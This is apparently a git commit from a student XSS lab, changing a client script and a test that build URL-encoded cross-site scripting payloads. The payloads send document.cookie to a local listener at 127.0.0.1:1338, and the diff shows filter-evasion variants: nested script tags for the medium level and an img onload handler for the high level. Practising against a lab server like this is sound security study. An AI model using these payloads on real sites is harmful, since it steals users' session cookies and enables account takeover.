6ff3b881202da5c35e693d9daf43379b2bd7aed2
Ed Shao <ss5902@columbia.edu>
2019-11-10 16:03:24 -0500

    commit m

--- client.py
+++ client.py
@@ -30,7 +30,7 @@ def xss(vuln_type, level):
         elif level == 'medium':
             comment = '/xss/1/medium?comment=%3Cscri%3Cscript%3Ept%3Ewindow.open%28%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2Fmedium%3Fcookie%3D%22%20%2B%20document.cookie%29%3C%2Fscript%3E'
         else:
-            comment = '/xss/1/high?comment=%3Cimg%20onload%3D%22window.open%28%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2Fmedium%3Fcookie%3D%22%20%2B%20document.cookie%29%22%3E'
+            comment = '/xss/1/high?comment=%3Cimg%20onload%3D%5C%27window.open%28%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2Fmedium%3Fcookie%3D%22%20%2B%20document.cookie%29%5C%27%3E'
         url = '/'.join([TARGET_SERVER_ENDPOINT, 'xss', vuln_type, level]) + '?comment=' + comment
         driver.get(url)
 
--- test.py
+++ test.py
@@ -1,6 +1,6 @@
 import re
 
-comment = '<img onload="window.open("http://127.0.0.1:1338/xss/medium?cookie=" + document.cookie)">'
+comment = '<img onload=\'window.open("http://127.0.0.1:1338/xss/medium?cookie=" + document.cookie)\'>'
 print(comment)
 comment = re.sub(r'<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t', '', comment, flags=re.IGNORECASE)
 print(comment)
